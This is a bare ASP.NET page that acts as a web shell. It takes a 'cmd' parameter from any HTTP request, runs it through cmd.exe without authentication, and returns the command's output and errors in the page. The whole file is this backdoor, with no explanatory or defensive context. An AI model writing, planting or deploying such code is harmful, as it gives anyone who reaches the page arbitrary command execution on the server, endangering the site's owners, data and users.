<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd))
{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd() + "</pre>");
}
%>